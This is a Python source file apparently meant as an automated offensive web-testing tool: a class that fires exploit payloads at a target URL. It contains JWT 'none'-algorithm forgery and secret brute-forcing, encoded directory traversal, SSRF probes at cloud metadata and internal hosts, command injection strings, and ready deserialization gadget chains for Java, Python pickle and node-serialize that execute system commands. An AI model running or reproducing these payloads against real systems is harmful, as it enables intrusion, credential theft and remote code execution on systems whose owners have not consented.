import asyncio
from typing import Dict, List, Optional
import aiohttp
import json
import re
from dataclasses import dataclass
from bs4 import BeautifulSoup
import hashlib
import random
import string
import jwt
import base64
from urllib.parse import urljoin, parse_qs

@dataclass
class ExploitResult:
    success: bool
    technique: str
    details: str
    payload: str
    response: Optional[str]
    additional_info: Optional[Dict] = None

class OffensiveTools:
    def __init__(self):
        self.session = aiohttp.ClientSession()
        self.discovered_vulns = []
        self.successful_exploits = []
        
    async def jwt_attacks(self, url: str, token: Optional[str] = None) -> List[ExploitResult]:
        """Test for JWT vulnerabilities."""
        results = []
        
        # None algorithm attack
        none_token = self._create_none_algorithm_token()
        results.append(await self._test_jwt_exploit(url, none_token, "None Algorithm"))
        
        # Weak secret bruteforce
        if token:
            weak_secret = await self._bruteforce_jwt_secret(token)
            if weak_secret:
                results.append(ExploitResult(
                    success=True,
                    technique="JWT Weak Secret",
                    details=f"Weak secret found: {weak_secret}",
                    payload=token,
                    response=None,
                    additional_info={"secret": weak_secret}
                ))
                
        return results

    async def directory_traversal(self, url: str) -> List[ExploitResult]:
        """Test for directory traversal vulnerabilities."""
        results = []
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in payloads:
            try:
                target_url = f"{url}?file={payload}"
                async with self.session.get(target_url) as response:
                    content = await response.text()
                    if self._verify_traversal_success(content):
                        results.append(ExploitResult(
                            success=True,
                            technique="Directory Traversal",
                            details=f"Successful traversal with payload: {payload}",
                            payload=payload,
                            response=content[:200]
                        ))
            except Exception:
                continue
                
        return results

    async def ssrf_attacks(self, url: str) -> List[ExploitResult]:
        """Test for Server-Side Request Forgery vulnerabilities."""
        results = []
        internal_endpoints = [
            "http://localhost/",
            "http://127.0.0.1/",
            "http://169.254.169.254/", # AWS metadata
            "http://192.168.0.1/",
            "http://10.0.0.1/",
            "file:///etc/passwd"
        ]
        
        for endpoint in internal_endpoints:
            encoded_endpoint = self._encode_ssrf_payload(endpoint)
            try:
                params = {
                    "url": encoded_endpoint,
                    "proxy": encoded_endpoint,
                    "uri": encoded_endpoint,
                    "path": encoded_endpoint
                }
                
                for param_name, payload in params.items():
                    test_url = f"{url}?{param_name}={payload}"
                    async with self.session.get(test_url) as response:
                        content = await response.text()
                        if self._verify_ssrf_success(content):
                            results.append(ExploitResult(
                                success=True,
                                technique="SSRF",
                                details=f"Successful SSRF with parameter: {param_name}",
                                payload=encoded_endpoint,
                                response=content[:200]
                            ))
            except Exception:
                continue
                
        return results

    async def command_injection(self, url: str) -> List[ExploitResult]:
        """Test for command injection vulnerabilities."""
        results = []
        payloads = [
            "$(whoami)",
            "`whoami`",
            ";whoami;",
            "| whoami",
            "|| whoami",
            "& whoami",
            "&& whoami",
            "%0awhoami",
            "whoami%0a",
            "${IFS}whoami",
            ">whoami"
        ]
        
        for payload in payloads:
            try:
                encoded_payload = self._encode_cmd_payload(payload)
                params = {
                    "cmd": encoded_payload,
                    "command": encoded_payload,
                    "exec": encoded_payload,
                    "execute": encoded_payload
                }
                
                for param_name, cmd_payload in params.items():
                    test_url = f"{url}?{param_name}={cmd_payload}"
                    async with self.session.get(test_url) as response:
                        content = await response.text()
                        if self._verify_cmd_injection(content):
                            results.append(ExploitResult(
                                success=True,
                                technique="Command Injection",
                                details=f"Successful injection with parameter: {param_name}",
                                payload=payload,
                                response=content[:200]
                            ))
            except Exception:
                continue
                
        return results

    async def deserialization_attacks(self, url: str) -> List[ExploitResult]:
        """Test for insecure deserialization vulnerabilities."""
        results = []
        payloads = self._generate_deser_payloads()
        
        for payload_name, payload in payloads.items():
            try:
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = {
                    "data": payload,
                    "object": payload,
                    "serialized": payload
                }
                
                for param_name, deser_payload in data.items():
                    async with self.session.post(url, data={param_name: deser_payload}, headers=headers) as response:
                        content = await response.text()
                        if self._verify_deserialization(content):
                            results.append(ExploitResult(
                                success=True,
                                technique="Deserialization",
                                details=f"Successful deserialization with payload: {payload_name}",
                                payload=deser_payload,
                                response=content[:200]
                            ))
            except Exception:
                continue
                
        return results

    def _create_none_algorithm_token(self) -> str:
        """Create JWT token with 'none' algorithm."""
        header = {"alg": "none", "typ": "JWT"}
        payload = {"admin": True, "user": "admin"}
        header_b64 = jwt.utils.base64url_encode(json.dumps(header).encode()).decode()
        payload_b64 = jwt.utils.base64url_encode(json.dumps(payload).encode()).decode()
        return f"{header_b64}.{payload_b64}."

    async def _bruteforce_jwt_secret(self, token: str) -> Optional[str]:
        """Attempt to bruteforce JWT secret."""
        with open("wordlists/jwt_secrets.txt", "r") as f:
            common_secrets = f.readlines()
            
        for secret in common_secrets:
            secret = secret.strip()
            try:
                jwt.decode(token, secret, algorithms=["HS256"])
                return secret
            except jwt.InvalidSignatureError:
                continue
        return None

    def _verify_traversal_success(self, content: str) -> bool:
        """Verify if directory traversal was successful."""
        patterns = [
            r"root:.*:0:0:",
            r"bin:.*:1:1:",
            r"nobody:.*:99:99:",
            r"HTTP_USER_AGENT",
            r"DOCUMENT_ROOT"
        ]
        return any(re.search(pattern, content) for pattern in patterns)

    def _encode_ssrf_payload(self, payload: str) -> str:
        """Encode SSRF payload to bypass filters."""
        encodings = [
            lambda x: x.replace(".", self._random_dots()),
            lambda x: "".join(f"%{ord(c):02x}" for c in x),
            lambda x: x.replace("localhost", "127.0.0.1"),
            lambda x: x.replace("http://", "gopher://")
        ]
        return random.choice(encodings)(payload)

    def _verify_ssrf_success(self, content: str) -> bool:
        """Verify if SSRF was successful."""
        indicators = [
            "Private network",
            "Internal server",
            "amazon.com",
            "metadata",
            "root:x:",
            "<!DOCTYPE"
        ]
        return any(indicator in content for indicator in indicators)

    def _encode_cmd_payload(self, payload: str) -> str:
        """Encode command injection payload."""
        encodings = [
            lambda x: "".join(f"%{ord(c):02x}" for c in x),
            lambda x: x.replace(" ", "${IFS}"),
            lambda x: "".join(f"\\x{ord(c):02x}" for c in x),
            lambda x: base64.b64encode(x.encode()).decode()
        ]
        return random.choice(encodings)(payload)

    def _verify_cmd_injection(self, content: str) -> bool:
        """Verify if command injection was successful."""
        patterns = [
            r"uid=\d+\(.*?\)",
            r"root:.*:0:0:",
            r"/bin/bash",
            r"Linux version",
            r"Directory of"
        ]
        return any(re.search(pattern, content) for pattern in patterns)

    def _generate_deser_payloads(self) -> Dict[str, str]:
        """Generate deserialization payloads."""
        return {
            "php_object": 'O:8:"stdClass":1:{s:4:"code";s:10:"phpinfo();"}',
            "java_object": base64.b64encode(b'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5UcmFuc2Zvcm1pbmdDb21wYXJhdG9yL+EyeH7z/HwCAAJMAApjb21wYXJhdG9ycQB+AAFMAAl0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAZtZXRob2R0ABJMamF2YS9sYW5nL1N0cmluZztbAAtQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB50AARleGVjdXEAfgAeAAAAAXEAfgAic3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGZXF1YWxzdXEAfgAeAAAAAXEAfgAWeA==').decode(),
            "python_pickle": base64.b64encode(b'cos\nsystem\n(S\'whoami\'\ntR.').decode(),
            "node_serialize": '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\');}()"}'
        }

    def _verify_deserialization(self, content: str) -> bool:
        """Verify if deserialization attack was successful."""
        indicators = [
            "PHP Version",
            "java.lang.Runtime",
            "python.exe",
            "node.exe",
            "uid=",
            "DOCUMENT_ROOT"
        ]
        return any(indicator in content for indicator in indicators)

    def _random_dots(self) -> str:
        """Generate random IP dots bypass."""
        bypasses = [
            "。", # Unicode full stop
            "｡",  # Unicode halfwidth full stop
            "．",  # Unicode full width full stop
            "⊡",  # Unicode square with fill
            "⋅",  # Unicode dot operator
        ]
        return random.choice(bypasses)

    async def close(self):
        """Cleanup resources."""
        if self.session and not self.session.closed:
            await self.session.close() 